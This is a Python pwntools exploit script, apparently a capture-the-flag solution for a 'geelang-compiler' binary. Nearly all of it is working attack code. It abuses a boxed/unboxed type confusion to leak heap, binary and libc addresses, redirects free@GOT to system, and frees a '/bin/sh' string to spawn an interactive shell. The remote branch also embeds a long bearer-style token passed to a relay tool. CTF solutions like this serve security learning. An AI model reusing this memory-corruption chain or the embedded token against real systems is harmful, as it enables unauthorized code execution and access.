from pwn import *

PROGNAME   = "./geelang-compiler"

if args.REMOTE:
    p = process(["./cli-relay", "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImNhZmZAZ2VlZ2xlLm9yZyIsInNlcnZpY2UiOiJ1YmVycHJveHlAc2VydmljZXMuZ2VlZ2xlLm9yZyIsImV4cCI6MTU3NTE0OTgwMn0.p-lpYOJ6RaImmd7HXm66pfZsUkk_Vbp206dDOqPSCzF0xuNEC6wDSeesh8ku_xMge_lbxEE9EzVzRBGpU92v5rVdiosjWT2oJP8ooSvatD3OcE8iZ3GFQpJZimUSMF6XigteUKxlAtKXjm8jg4NDQtVdXm5WQK3rSjvdOrzpoeU3kykIq6_Jmulv48a1bGLCaoetq55S-PL57rTrDwDsU6LqntJyQEDU15BO9ek9vZTDlDSs7TvyDp1UtAYZiWjx5qhgSOYqjmuMN9weTC8WAQJBdrMBzKWSfRD4CWozSfMvpazVMJcfqp-G9LKM64iW1m30Fnl_OYTM4NtHMrL4tRLGSfjPqptcd1GIYar3lxU5ka5161rSq-XSMLPVdbR7cRw1HVCz-Qbh2pxnp01DeA70Dm6rNvOhUglqHAnoNmajCUj7FxsGGHvnDOCwS7W8nAAVy1ctBfWf5fdR5a1VhTAoxLfYXXYNqi2uWPDQp5unraS1Ck35ZQKCbIo3gbT8IkbzSwO89ZTJwcs79nGRIlV9pQl1AWpKK-o8AeKBI-S65RZ-VcdcJX7MaCzun-7kZoD0ceF088Y9wSTUF7vpiTolop58qStey9ptdrz74RokJulS8u1n7WCnLL8kdairsyJkmsPA4O8q7bvtuANFMXQjO1bPxXjSbf7BOWUYyok", "geelang.corp.geegle.org"])

    elf = ELF(PROGNAME)
else:
    p = process(PROGNAME)
    elf = p.elf
libc = ELF("./libc.so.6")
pause()
GETSHELL = '''
INT a 99
DEL a
BOX b 1 # Create boxed/unboxed overlap
PRINT a # Leak Heap chunk

INT z 24
SUB a z
PRINT b # Leak Binary (print_int) Address


SET z {}
MOV a b
SUB a z # Offset to binary base
PRINT a

SET z {}
ADD a z # Offset to free GOT entry

PRINT a
PRINT b # Leak free@GOT

INT SYSTEM 0
SET z {}
MOV SYSTEM b
SUB SYSTEM z # Offset to libc base

SET z {}
ADD SYSTEM z # Offset to system
PRINT SYSTEM

MOV b SYSTEM

SET a {} # /bin/sh
DEL a

END
'''.format(elf.symbols["print_int"],
        elf.got["free"],
        libc.symbols["free"],
        libc.symbols["system"],
        u64("/bin/sh\x00")
        )
print GETSHELL
pause()
p.sendline(GETSHELL)

p.interactive()

